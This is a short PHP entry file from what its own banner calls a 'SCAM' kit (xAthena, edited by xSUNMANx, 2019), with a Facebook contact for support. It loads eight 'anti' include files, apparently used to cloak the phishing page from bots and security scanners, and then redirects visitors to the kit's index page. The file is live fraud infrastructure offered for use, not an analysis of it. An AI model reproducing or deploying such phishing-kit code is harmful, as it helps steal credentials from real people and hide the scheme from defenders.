<?php
/*
                /$$$$$$  /$$   /$$ /$$   /$$ /$$      /$$  /$$$$$$  /$$   /$$          
               /$$__  $$| $$  | $$| $$$ | $$| $$$    /$$$ /$$__  $$| $$$ | $$          
 /$$  /$$  /$$| $$  \__/| $$  | $$| $$$$| $$| $$$$  /$$$$| $$  \ $$| $$$$| $$ /$$   /$$
| $$ | $$ | $$|  $$$$$$ | $$  | $$| $$ $$ $$| $$ $$/$$ $$| $$$$$$$$| $$ $$ $$|  $$ /$$/
| $$ | $$ | $$ \____  $$| $$  | $$| $$  $$$$| $$  $$$| $$| $$__  $$| $$  $$$$ \  $$$$/ 
| $$ | $$ | $$ /$$  \ $$| $$  | $$| $$\  $$$| $$\  $ | $$| $$  | $$| $$\  $$$  >$$  $$ 
|  $$$$$/$$$$/|  $$$$$$/|  $$$$$$/| $$ \  $$| $$ \/  | $$| $$  | $$| $$ \  $$ /$$/\  $$
 \_____/\___/  \______/  \______/ |__/  \__/|__/     |__/|__/  |__/|__/  \__/|__/  \__/   
 
 SCAM xAthena Edited By xSUNMANx V.1 (2019)
For Any Help Contact Me on Facebook
https://www.facebook.com/rifinha
*/
  	require 'anti1.php';
	require 'anti2.php';
	require 'anti3.php';
	require 'anti4.php';
	require 'anti5.php';
	require 'anti6.php';
	require 'anti7.php';
	require 'anti8.php';
	exit(header("Location: ../index.php"));
?>